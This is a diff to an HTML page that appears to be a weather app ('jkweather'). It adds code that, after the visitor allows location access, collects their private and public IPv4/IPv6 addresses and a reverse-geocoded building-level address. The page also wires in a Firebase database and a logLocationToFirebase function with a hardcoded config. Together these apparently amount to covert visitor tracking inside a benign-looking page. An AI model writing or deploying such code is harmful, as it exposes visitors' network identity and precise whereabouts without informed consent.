@@ -323,6 +323,9 @@ if (navigator.geolocation) {
 </script>
 
 <script>
+let LAT = null
+let LON = null
+
 let PUBLIC_IPV4 = "?"
 let PUBLIC_IPV6 = "?"
 
@@ -400,11 +403,7 @@ if(LAT === null || LON === null) return
 const url =
 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${LAT}&lon=${LON}&zoom=18&addressdetails=1`
 
-const res = await fetch(url,{
-headers:{
-"User-Agent":"jkweather"
-}
-})
+const res = await fetch(url)
 
 const data = await res.json()
 
@@ -412,7 +411,6 @@ CLOSEST_BUILDING =
 data.name ||
 data.display_name ||
 "?"
-
 }
 </script>
     
@@ -420,10 +418,30 @@ data.display_name ||
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
+if (navigator.geolocation) {
+
+navigator.geolocation.getCurrentPosition(async position => {
+
+LAT = position.coords.latitude
+LON = position.coords.longitude
+
 await getPrivateIPs()
 await getIPv4()
 await getIPv6()
 await getClosestBuilding()
+
+getLocationName(LAT, LON)
+getWeather(LAT, LON)
+
+setInterval(()=>getWeather(LAT, LON),10000)
+
+}, () => {
+
+document.getElementById("location").textContent = "Location denied"
+
+})
+
+}
     
 const firebaseConfig = {
   apiKey: "AIzaSyAEHnFIUqKy1NJzuqvvrsg3zhNEciIOLqo",
@@ -456,4 +474,5 @@ window.logLocationToFirebase = function(lat, lon, city, state) {
     
 </body>
 </html>
+
 
